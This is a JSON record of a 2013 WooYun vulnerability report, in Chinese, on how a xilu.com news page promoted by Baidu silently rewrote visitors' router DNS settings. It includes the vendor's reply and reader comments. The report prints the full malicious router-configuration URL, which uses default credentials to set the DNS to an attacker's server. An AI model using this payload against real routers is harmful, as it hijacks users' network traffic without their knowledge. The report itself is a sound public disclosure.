{"id": 8494, "wybug_id": "wooyun-2013-037425", "wybug_title": "西陆网（xilu.com）首页劫持用户本地路由器DNS", "wybug_corp": "百度", "wybug_author": "ccc008", "wybug_date": "2013-09-18 09:16", "wybug_open_date": "2013-11-02 09:17", "wybug_type": "用户资料大量泄漏", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-02：\t细节向公众公开  简要描述： 今天通过百度新版首页，访问西陆网的一条新闻后，发现本地路由器DNS被劫持为121.157.39.111。于是具体分析了一下劫持的过程。由于是百度首页推荐的新闻，影响人群应该不小。报告给百度，是希望百度把这个垃圾网站踢出百度新闻源，免得祸害人呀 详细说明：  1、在百度首页，访问了一条 “赵红霞真实照片”的新闻。网页地址 http://shizheng.xilu.com/20130917/1000010000094910.html\n\n2、通过firebug分析，发现页面包含了如下链接。\n\nhttp://admin:admin@192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&ip1=192.168.1.100&ip2=192.168.1.199&Lease=120&gateway=0.0.0.0&domain=&dnsserver=&dnsserver=121.157.39.111&dnsserver2=114.114.114.114&Save=%B1%A3+%B4%E6多次访问发现admin:admin，会变化，例如admin:123456，也就是利用路由器默认密码不断尝试修改路由器dns为121.157.39.111、114.114.114.114。通过Referer可以看出，这个修改dns的链接来源于http://gz.dagushu.com/center.html。3、切换firebug到html，发现以框架形式包含了http://gz.dagushu.com/center.html\n\n4、最终存在弱口令的路由器dns被修改。整个劫持过程完成。\n\n补充：进一步分析，发现恶意代码通过<script src=\"http://newspage.xilu.com/model/xilu_bottom.js\" type=\"text/javascript\" language=\"JavaScript\"> 引入，属于西陆网的域名，可见其有一定的主观故意。   漏洞证明：  \n\n   修复方案：  把西陆网踢出百度新闻源   版权声明：转载请注明来源 ccc008@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2013-09-19 22:31 厂商回复： 感谢提交此问题，我们正在联系业务部门处理，祝中秋快乐。--“百度，因你更安全” 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-18 09:23 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  牛逼！    \n     2013-09-18 10:08 |    \t\tccc008 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | ccc008)\t\t \n  补充一下，今天进一步分析，发现包含恶意的js位于http://newspage.xilu.com 这个域名下，可见是西陆网故意为之    \n     2013-09-18 10:09 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @ccc008 编辑下 我更新 ：）    \n     2013-09-18 10:12 |    \t\tccc008 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | ccc008)\t\t \n  @xsser 已编辑。    \n     2013-09-18 10:12 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  怎么发现dns被改了？    \n     2013-09-18 10:13 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  这个必须mark，想知道具体细节。我学校网站也会改路由器dns，，很蛋疼    \n     2013-09-18 13:23 |    \t\tkEvin1986 \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:6        | $ ? #)\t\t \n  .如此弱的路由器密码也不说啥了.......    \n     2013-09-18 13:30 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  话说我刚刚看到@搜狐 回复了，，怎么一下又没了,我眼花了？    \n     2013-09-18 13:37 |    \t\tccc008 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | ccc008)\t\t \n  @kEvin1986 这种劫持是针对弱口令和默认密码。像我以为设置了强壮的无线密码就没事的估计不在少数，所以不能偷懒，路由器的登录密码一定不要是默认的。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}